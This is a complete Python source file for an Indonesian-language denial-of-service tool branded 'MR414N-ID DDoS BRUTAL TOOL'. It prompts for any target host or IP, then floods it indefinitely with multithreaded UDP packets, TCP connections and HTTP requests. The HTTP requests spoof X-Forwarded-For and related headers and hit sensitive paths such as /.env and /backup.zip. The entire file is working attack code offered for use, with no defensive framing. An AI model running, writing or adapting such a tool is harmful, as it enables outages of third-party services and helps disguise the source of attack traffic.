# lang: Python 3.11+, file: ddos.py
# build: pip install colorama
# usage: python ddos.py
# stop: Ctrl+C

import socket
import threading
import random
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

RUNNING = True

# ---- RAINBOW ----

def rainbow(text):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    out = ""
    i = 0
    for ch in text:
        if ch != ' ':
            out += colors[i % len(colors)] + Style.BRIGHT + ch
            i += 1
        else:
            out += ' '
    return out + Style.RESET_ALL

# ---- BEBEK LINUX ----

def tampil_bebek():
    bebek_lines = [
        r"        .88888888:.",
        r"       88888888.88888.",
        r"     .8888888888888888.",
        r"     888888888888888888",
        r"     88' _`88'_  `8888.",
        r"     88 88 88 88  88888",
        r"     88_88_::_88_:88888",
        r"     88:::,::,:::::8888",
        r"     88`:::::::::'`8888",
        r"    .88  `:::::'    8:88.",
        r"   8888            `8:888.",
        r" .8888'             `888888.",
        r".8888:..  .::.  ...:'8888888:.",
        r"8888.'     :'     `'::`88:88888",
        r"`8888;..  ;;;;.  ;;;; `88:88888",
        r" `8888888888888' 8888  88:88888",
        r"  `.8888888888'  8888  88888888",
    ]
    colors = [Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.YELLOW, Fore.GREEN]
    for idx, line in enumerate(bebek_lines):
        print(colors[idx % len(colors)] + Style.BRIGHT + line)
        time.sleep(0.03)
    print()

# ---- BANNER MR414N-ID ----

def tampil_banner():
    baris = [
        "███╗   ███╗██████╗ ██╗  ██╗ ██╗██╗  ██╗███╗   ██╗      ██╗██████╗ ",
        "████╗ ████║██╔══██╗ ██╗██╔╝ ██║██║  ██║████╗  ██║      ██║██╔══██╗",
        "██╔████╔██║██████╔╝  ████╔╝  ██║███████║██╔██╗ ██║      ██║██║  ██║",
        "██║╚██╔╝██║██╔══██╗ ██╔╝██╗  ╚═╝╚════██║██║╚██╗██║      ██║██║  ██║",
        "██║ ╚═╝ ██║██║  ██║██╔╝  ██╗ ██╗     ██║██║ ╚████║      ██║██████╔╝",
        "╚═╝     ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝ ╚═╝     ╚═╝╚═╝  ╚═══╝      ╚═╝╚═════╝",
    ]
    print()
    for line in baris:
        print(rainbow(line))
        time.sleep(0.06)
    print()

# ---- BANNER DDoS ----

def tampil_ddos():
    ddos_baris = [
        "██████╗ ██████╗  ██████╗ ███████╗",
        "██╔══██╗██╔══██╗██╔═══██╗██╔════╝",
        "██║  ██║██║  ██║██║   ██║███████╗",
        "██║  ██║██║  ██║██║   ██║╚════██║",
        "██████╔╝██████╔╝╚██████╔╝███████║",
        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝",
    ]
    for line in ddos_baris:
        print(Fore.CYAN + Style.BRIGHT + line)
        time.sleep(0.06)
    print()

# ---- LOADING ----

def loading_bar(teks, durasi=1.5):
    bar_len = 40
    start = time.time()
    while True:
        elapsed = time.time() - start
        ratio = min(elapsed / durasi, 1.0)
        filled = int(bar_len * ratio)
        bar = "█" * filled + "░" * (bar_len - filled)
        pct = int(ratio * 100)
        sys.stdout.write(
            f"\r{Fore.GREEN}[{Fore.YELLOW}{bar}{Fore.GREEN}] "
            f"{Fore.WHITE}{Style.BRIGHT}{pct}% {Fore.CYAN}{teks}{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        if ratio >= 1.0:
            break
        time.sleep(0.02)
    print()

def spinner(teks, durasi=1.2):
    chars = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    end = time.time() + durasi
    i = 0
    while time.time() < end:
        sys.stdout.write(
            f"\r{Fore.MAGENTA}[{chars[i % len(chars)]}] "
            f"{Fore.WHITE}{Style.BRIGHT}{teks}{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        time.sleep(0.07)
        i += 1
    print()

# ---- RESOLVE ----

def resolve_target(host):
    try:
        return socket.gethostbyname(host)
    except Exception:
        return None

# ---- INPUT ----

def input_interaktif():
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(Fore.RED   + Style.BRIGHT + "  ⚡ MR414N-ID DDoS BRUTAL TOOL — INFINITE MODE ⚡")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print()

    while True:
        raw = input(
            f"{Fore.YELLOW}{Style.BRIGHT}  [?] MASUKKAN LINK / IP TARGET{Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
        ).strip()
        print(Style.RESET_ALL, end="")
        if not raw:
            print(Fore.RED + "  [!] Target tidak boleh kosong.")
            continue
        host = raw.replace("https://","").replace("http://","").split("/")[0]
        spinner(f"Resolving {host}...", 1.0)
        ip = resolve_target(host)
        if not ip:
            print(Fore.RED + f"  [!] Gagal resolve {host}. Coba lagi.")
            continue
        if ip != host:
            print(Fore.GREEN + f"  [✓] {host} → {Fore.RED}{Style.BRIGHT}{ip}")
        break

    port_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PORT {Fore.WHITE}(default 80){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    port = int(port_raw) if port_raw.isdigit() else 80

    print(f"{Fore.YELLOW}{Style.BRIGHT}  [?] MODE SERANGAN:")
    print(f"{Fore.CYAN}      [1] UDP  — saturasi bandwidth")
    print(f"{Fore.CYAN}      [2] TCP  — banjiri connection table")
    print(f"{Fore.CYAN}      [3] HTTP — pukul CPU server")
    print(f"{Fore.CYAN}      [4] MIX  — semua sekaligus (paling brutal)")
    mode_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PILIH {Fore.WHITE}(1/2/3/4, default 4){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    mode_map_input = {"1":"udp","2":"tcp","3":"http","4":"mix"}
    mode = mode_map_input.get(mode_raw, "mix")

    thr_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] JUMLAH THREAD {Fore.WHITE}(default 500){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    threads = int(thr_raw) if thr_raw.isdigit() else 500

    ukuran_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] UKURAN PAYLOAD {Fore.WHITE}(bytes, default 65000){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    ukuran = int(ukuran_raw) if ukuran_raw.isdigit() else 65000

    return ip, host, port, mode, threads, ukuran

# ---- TAMPIL INFO ----

def tampil_info(host, ip, port, mode, threads, ukuran):
    print()
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(Fore.RED   + Style.BRIGHT + "  💀 SERANGAN DIMULAI — BERJALAN SAMPAI CTRL+C 💀")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(f"{Fore.YELLOW}  [»] HOST        : {Fore.RED}{Style.BRIGHT}{host}")
    print(f"{Fore.YELLOW}  [»] IP TARGET   : {Fore.RED}{Style.BRIGHT}{ip}")
    print(f"{Fore.YELLOW}  [»] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
    print(f"{Fore.YELLOW}  [»] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
    print(f"{Fore.YELLOW}  [»] THREADS     : {Fore.RED}{Style.BRIGHT}{threads}")
    print(f"{Fore.YELLOW}  [»] PAYLOAD     : {Fore.RED}{Style.BRIGHT}{ukuran} bytes")
    print(f"{Fore.YELLOW}  [»] DELAY       : {Fore.RED}{Style.BRIGHT}0.01s per paket")
    print(f"{Fore.YELLOW}  [»] STOP        : {Fore.GREEN}{Style.BRIGHT}Ctrl+C")
    print(f"{Fore.YELLOW}  [»] STATUS      : {Fore.GREEN}{Style.BRIGHT}⚡ RUNNING INFINITE ⚡")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print()

# ---- STATS ----

stats = {"kirim": 0, "error": 0, "bytes": 0}
lock  = threading.Lock()

# ---- FLOOD FUNCTIONS ----

def udp_flood(ip, port, ukuran):
    global RUNNING
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    tujuan = (ip, port)
    while RUNNING:
        try:
            sock.sendto(random.randbytes(ukuran), tujuan)
            with lock:
                stats["kirim"] += 1
                stats["bytes"] += ukuran
        except Exception:
            with lock:
                stats["error"] += 1
        time.sleep(0.01)
    sock.close()

def tcp_flood(ip, port, ukuran):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.sendall(random.randbytes(ukuran))
            s.close()
            with lock:
                stats["kirim"] += 1
                stats["bytes"] += ukuran
        except Exception:
            with lock:
                stats["error"] += 1
        time.sleep(0.01)

def http_flood(ip, port, ukuran):
    global RUNNING
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36",
        "curl/8.4.0",
        "python-requests/2.31.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ]
    paths = [
        "/", "/index.php", "/login", "/admin", "/wp-admin",
        "/api/v1/users", "/search?q=" + "A"*256,
        "/.env", "/config.php", "/backup.zip",
        "/api/data?id=" + "1"*128, "/xmlrpc.php",
        "/?a=" + "X"*512,
    ]
    rnd_ip = lambda: (
        f"{random.randint(1,254)}.{random.randint(1,254)}."
        f"{random.randint(1,254)}.{random.randint(1,254)}"
    )
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            ua   = random.choice(uas)
            path = random.choice(paths)
            req  = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*\r\n"
                f"Accept-Language: id-ID,id;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Forwarded-For: {rnd_ip()}\r\n"
                f"X-Real-IP: {rnd_ip()}\r\n"
                f"X-Originating-IP: {rnd_ip()}\r\n"
                f"Referer: https://www.google.com/\r\n\r\n"
            ).encode()
            s.sendall(req)
            s.close()
            with lock:
                stats["kirim"] += 1
                stats["bytes"] += len(req)
        except Exception:
            with lock:
                stats["error"] += 1
        time.sleep(0.01)

# ---- STATISTIK LIVE ----

def cetak_statistik(ip, port, mode):
    global RUNNING
    bar_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
    tick  = 0
    start = time.time()
    while RUNNING:
        with lock:
            k = stats["kirim"]
            e = stats["error"]
            b = stats["bytes"]
        elapsed = max(0.1, time.time() - start)
        pps  = k / elapsed
        mbps = (b * 8) / (elapsed * 1_000_000)
        bc   = bar_colors[tick % len(bar_colors)]

        # spinning skull
        skulls = ["💀","👾","⚡","🔥","💥"]
        sk = skulls[tick % len(skulls)]

        sys.stdout.write(
            f"\r{bc}{Style.BRIGHT}{sk} "
            f"{Fore.YELLOW}TARGET:{Fore.RED}{Style.BRIGHT}{ip}:{port} "
            f"{Fore.WHITE}│ "
            f"{Fore.CYAN}MODE:{Fore.RED}{Style.BRIGHT}{mode.upper()} "
            f"{Fore.WHITE}│ "
            f"{Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{k:,} "
            f"{Fore.WHITE}│ "
            f"{Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{pps:,.0f} "
            f"{Fore.WHITE}│ "
            f"{Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{mbps:.2f} "
            f"{Fore.WHITE}│ "
            f"{Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{e:,} "
            f"{Fore.WHITE}│ "
            f"{Fore.YELLOW}WAKTU:{Fore.WHITE}{Style.BRIGHT}{elapsed:.0f}s"
            f"{Style.RESET_ALL}    "
        )
        sys.stdout.flush()
        tick += 1
        time.sleep(0.25)

# ---- MAIN ----

if __name__ == "__main__":
    os.system("clear" if os.name == "posix" else "cls")

    tampil_bebek()
    tampil_banner()
    tampil_ddos()

    loading_bar("Memuat sistem senjata...", 1.2)
    loading_bar("Menyiapkan payload brutal...", 1.0)
    spinner("Mengaktifkan mode infinite...", 0.8)

    print()
    ip, host, port, mode, threads, ukuran = input_interaktif()

    loading_bar("Mengunci target...", 1.2)
    spinner("Membuka jalur serangan...", 0.8)

    tampil_info(host, ip, port, mode, threads, ukuran)

    # stat thread
    stat_thread = threading.Thread(
        target=cetak_statistik,
        args=(ip, port, mode),
        daemon=True
    )
    stat_thread.start()

    flood_map = {
        "udp":  udp_flood,
        "tcp":  tcp_flood,
        "http": http_flood,
    }

    try:
        if mode == "mix":
            per_mode = threads // 3
            all_funcs = [udp_flood, tcp_flood, http_flood]
            with ThreadPoolExecutor(max_workers=threads) as pool:
                futures = []
                for fn in all_funcs:
                    for _ in range(per_mode):
                        futures.append(pool.submit(fn, ip, port, ukuran))
                for f in futures:
                    try:
                        f.result()
                    except Exception:
                        pass
        else:
            fn = flood_map[mode]
            with ThreadPoolExecutor(max_workers=threads) as pool:
                futures = [pool.submit(fn, ip, port, ukuran) for _ in range(threads)]
                for f in futures:
                    try:
                        f.result()
                    except Exception:
                        pass

    except KeyboardInterrupt:
        RUNNING = False
        time.sleep(0.5)
        print(f"\n\n{Fore.RED}{Style.BRIGHT}{'═'*65}")
        print(f"  [✋] DIHENTIKAN OLEH USER")
        print(f"  [»] Total Kirim : {stats['kirim']:,} paket")
        print(f"  [»] Total Error : {stats['error']:,}")
        print(f"  [»] Total Data  : {stats['bytes']/1_000_000:.2f} MB")
        print(f"{'═'*65}{Style.RESET_ALL}")
        sys.exit(0)
